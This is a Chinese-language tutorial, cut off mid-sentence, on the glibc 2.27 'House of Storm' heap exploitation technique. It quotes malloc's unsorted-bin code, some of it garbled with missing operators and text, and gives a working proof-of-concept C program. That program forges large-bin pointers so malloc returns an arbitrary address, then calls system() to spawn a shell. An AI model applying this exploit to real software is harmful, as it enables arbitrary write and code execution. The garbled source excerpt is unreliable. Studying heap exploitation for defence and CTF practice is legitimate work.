一个很抽象的漏洞
## 原理
源码截取自glibc-2.27/malloc/malloc.c:3729
该段代码的功能就是在`unsorted bin`中找到与malloc的chunk相匹配的chunk，如果不匹配就把该`unsorted
bin`放回到它对应的bin中，利用点就在这段代码里面。
    for (;; )
        {
          int iters = 0;
          while ((victim = unsorted_chunks (av)->bk) != unsorted_chunks (av))
            {
              bck = victim->bk;
              if (__builtin_expect (chunksize_nomask (victim)  av->system_mem, 0))
                malloc_printerr ("malloc(): memory corruption");
              size = chunksize (victim);
              /*
                 If a small request, try to use last remainder if it is the
                 only chunk in unsorted bin.  This helps promote locality for
                 runs of consecutive small requests. This is the only
                 exception to best-fit, and applies only when there is
                 no exact fit for a small chunk.
               */
              if (in_smallbin_range (nb) &&
                  bck == unsorted_chunks (av) &&
                  victim == av->last_remainder &&
                  (unsigned long) (size) > (unsigned long) (nb + MINSIZE))
                {
                  /* split and reattach remainder */
                  remainder_size = size - nb;
                  remainder = chunk_at_offset (victim, nb);
                  unsorted_chunks (av)->bk = unsorted_chunks (av)->fd = remainder;
                  av->last_remainder = remainder;
                  remainder->bk = remainder->fd = unsorted_chunks (av);
                  if (!in_smallbin_range (remainder_size))
                    {
                      remainder->fd_nextsize = NULL;
                      remainder->bk_nextsize = NULL;
                    }
                  set_head (victim, nb | PREV_INUSE |
                            (av != &main_arena ? NON_MAIN_ARENA : 0));
                  set_head (remainder, remainder_size | PREV_INUSE);
                  set_foot (remainder, remainder_size);
                  check_malloced_chunk (av, victim, nb);
                  void *p = chunk2mem (victim);
                  alloc_perturb (p, bytes);
                  return p;
                }
              /* remove from unsorted list */
              unsorted_chunks (av)->bk = bck;
              bck->fd = unsorted_chunks (av);
              /* Take now instead of binning if exact fit */
              if (size == nb)
                {
                  set_inuse_bit_at_offset (victim, size);
                  if (av != &main_arena)
            set_non_main_arena (victim);
    #if USE_TCACHE
              /* Fill cache first, return to user only if cache fills.
             We may return one of these chunks later.  */
              if (tcache_nb
              && tcache->counts[tc_idx] fd;
                }
              else
                {
                  victim_index = largebin_index (size);
                  bck = bin_at (av, victim_index);
                  fwd = bck->fd;
                  /* maintain large bins in sorted order */
                  if (fwd != bck)
                    {
                      /* Or with inuse bit to speed comparisons */
                      size |= PREV_INUSE;
                      /* if smaller than smallest, bypass loop below */
                      assert (chunk_main_arena (bck->bk));
                      if ((unsigned long) (size)
                  bk))
                        {
                          fwd = bck;
                          bck = bck->bk;
                          victim->fd_nextsize = fwd->fd;
                          victim->bk_nextsize = fwd->fd->bk_nextsize;
                          fwd->fd->bk_nextsize = victim->bk_nextsize->fd_nextsize = victim;
                        }
                      else
                        {
                          assert (chunk_main_arena (fwd));
                          while ((unsigned long) size fd_nextsize;
                  assert (chunk_main_arena (fwd));
                            }
                          if ((unsigned long) size
                  == (unsigned long) chunksize_nomask (fwd))
                            /* Always insert in the second position.  */
                            fwd = fwd->fd;
                          else
                            {
                              victim->fd_nextsize = fwd;
                              victim->bk_nextsize = fwd->bk_nextsize;
                              fwd->bk_nextsize = victim;
                              victim->bk_nextsize->fd_nextsize = victim;
                            }
                          bck = fwd->bk;
                        }
                    }
                  else
                    victim->fd_nextsize = victim->bk_nextsize = victim;
                }
              mark_bin (av, victim_index);
              victim->bk = bck;
              victim->fd = fwd;
              fwd->bk = victim;
              bck->fd = victim;
    #if USE_TCACHE
          /* If we've processed as many chunks as we're allowed while
         filling the cache, return one of the cached ones.  */
          ++tcache_unsorted_count;
          if (return_cached
          && mp_.tcache_unsorted_limit > 0
          && tcache_unsorted_count > mp_.tcache_unsorted_limit)
        {
          return tcache_get (tc_idx);
        }
    #endif
    #define MAX_ITERS       10000
              if (++iters >= MAX_ITERS)
                break;
            }
原理就是`unsorted bin`上面储存了一个还没归位`large bin`和我们要申请的任意地址，`large
bin`的`bk_nextsize`也被我么所控制指向申请的任意地址chunk的size部分，当我们再次申请的chunk的时候，`large
bin`归位，触发的效果就是修改了任意地址chunk的size部分，但进行第二次`unsorted bin`搜索的时候就能申请到那个任意地址。
## 条件
  1. 可以控制`unsorted bin`和`large bin`
  2. 任意地址chunk的size的低四位要为0
## 代码解析
由于这个漏洞比较复杂，我将会用代码来进行解释。
### 有PIE的情况
    // compiled: gcc -g -fPIC -pie House_of_Strom.c -o House_of_Strom
    #include 
    #include 
    #include 
    struct {
        char padding[0x10]; // NULL padding
        char sh[0x10];
    }global_container = {"","id"};
    int main()
    {
        char *unsorted_bin, *large_bin, *fake_chunk, *ptr;
        unsorted_bin = malloc(0x4e8); // size 0x4f0
        // 防止合并
        malloc(0x18);
        large_bin = malloc(0x4d8); // size 0x4e0
        // 防止合并
        malloc(0x18);
        // FIFO
        free(large_bin); // 先放小的chunk
        free(unsorted_bin);
        // large_bin 归位
        unsorted_bin = malloc(0x4e8);
        // unsorted_bin 归位
        free(unsorted_bin);
        fake_chunk = global_container.sh - 0x10;
        ((size_t *)unsorted_bin)[0] = 0; // unsorted_bin->fd
        ((size_t *)unsorted_bin)[1] = (size_t)fake_chunk; // unsorted_bin->bk
        ((size_t *)large_bin)[0] = 0; // large_bin->fd
        // 用于创建假块的“bk”，以避免从未排序的bin解链接时崩溃
        ((size_t *)large_bin)[1] = (size_t)fake_chunk + 8; // large_bin->fd
        ((size_t *)large_bin)[2] = 0; // large_bin->fd_nextsize
        // 用于使用错误对齐技巧创建假块的“大小”
        ((size_t *)large_bin)[3] = (size_t)fake_chunk - 0x18 - 5; // large_bin->bk_nextsize
        ptr = malloc(0x48);
        strncpy(ptr, "/bin/sh", 0x48 - 1);
        system(global_container.sh);
        return 0;
    }
下面我将对代码分段解释。
#### 可控的 unsorted bin 和 large bin
    unsorted_bin = malloc(0x4e8); // size 0x4f0
    // 防止合并
    malloc(0x18);
    large_bin = malloc(0x4d8); // size 0x4e0
    // 防止合并
    malloc(0x18);
    // FIFO
    free(large_bin); // 先放小的chunk
    free(unsorted_bin);
    // large_bin 归位
    unsorted_bin = malloc(0x4e8);
    // unsorted_bin 归位
    free(unsorted_bin);
可以看到我们事先申请了两块chunk，一块放在`large bin`中，一块放在`unsorted bin`中。这两块chunk我们是可以控制的。
#### 修改 unsorted bin
    ((size_t *)unsorted_bin)[0] = 0; // unsorted_bin->fd
    ((size_t *)unsorted_bin)[1] = (size_t)fake_chunk; // unsorted_bin->bk
在进行下一次`malloc`的时候，会先在`unsorted